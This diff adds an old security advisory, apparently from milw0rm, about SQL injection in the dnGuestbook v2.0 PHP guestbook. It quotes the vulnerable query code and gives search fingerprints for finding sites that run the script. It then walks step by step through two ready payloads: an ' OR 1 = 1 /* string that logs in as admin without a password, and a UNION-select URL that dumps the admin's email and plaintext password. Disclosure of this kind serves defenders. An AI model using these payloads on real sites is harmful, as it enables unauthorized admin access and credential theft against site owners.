@@ -1,0 +1,79 @@
+#####################################################
+# \_______________________________________________/ #
+# |                                               | #
+# |                                               | #
+# |              SECURITY ADVISORY                | #
+# |                                               | #
+# |                                               | #
+# /¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\ #
+#####################################################
+
+
+
+     advisory: dnGuestbook <= v2.0 remote sql injection vulnerability
+      release: 2006-04-08
+       author: snatcher [snatcher at gmx.ch]
+      country: switzerland  |+| 
+      
+  application: dnGuestbook <= v2.0
+     download: http://www.designnation.de/
+ app.descript: a php / mysql based guestbook script with an admin panel
+
+  description: because of the false implemented userinputs you can login as admin with a simpel sql injection.
+               afterward you can exploit a not validated GET variable to get admin's email and password.
+  fingerprint: google -> "dnGuestbook by design-nation.de Version" -> 331
+               msn -> "dnGuestbook by design-nation.de Version" -> 249
+   conditions: php.ini -> magic_quotes_gpc = Off
+       greets: all security guys and coders over the world, honkey :>, ..
+
+
+
+---------- LOGIN AS ADMIN ----------
+
+admin.php - line 771, 772
+  $result = mysql_query ("SELECT * FROM dnguestbook_user WHERE mail='$mail' AND passwort='$passwort';");
+  $eingeloggt = mysql_num_rows($result);
+
+if magic_quotes_gpc is off, the ' won't be escaped and you can inject malicious sql code here.
+the script only verifies if a result is given back, and doesn't check, if the entered email and 
+password are the same like the email and password in the database.
+
+you gonna log in with following username (the password isn't necessary):
+
+E-Mail: ' OR 1 = 1 /*
+Passwort: b0000m
+
+the query would look like this:
+
+  SELECT * FROM dnguestbook_user WHERE mail='' OR 1 = 1 /* AND passwort='b0000m'
+
+the expression "/*" comments out the following part of the query.
+the query will match always, because the WHERE - clause with "OR 1 = 1" is always true.
+
+now you are logged in as admin. how will you get the admin password?
+
+
+---------- GET ADMIN PASSWORD ----------
+
+in the adminpanel, you click the link "Beiträge". after that, you click the [e] right of a guestbook
+entry. it doesn't matter which entry you choose. normally, you can edit here some guestbok entries.
+the uri will look like this:
+
+  http://yourhost.com/path_to_gb/admin.php?gbgo=edit&id=8
+  
+two variables are transmitted over GET but only "id=8" is relevant for us.
+
+admin.php - line 678
+  $result = mysql_query ("SELECT * FROM dnguestbook_eintrag WHERE id=$id;");
+
+you see, that the variable "id" isn't validated. you can inject malicious sql code again.
+we make use of the UNION operator.
+
+ http://yourhost.com/path_to_gb/admin.php?gbgo=edit&id=-999%20union%20select%200,passwort,0,mail,mail,mail,mail,0,0,passwort%20from%20dnguestbook_user
+
+the admin's email is shown in the field "*Ihre E-Mail:" and the admin's password in the field "*Ihr Text:" (plaintext !!)
+
+description of the UNION operator:
+  http://dev.mysql.com/doc/refman/5.0/en/union.html
+
+# milw0rm.com [2006-04-09]
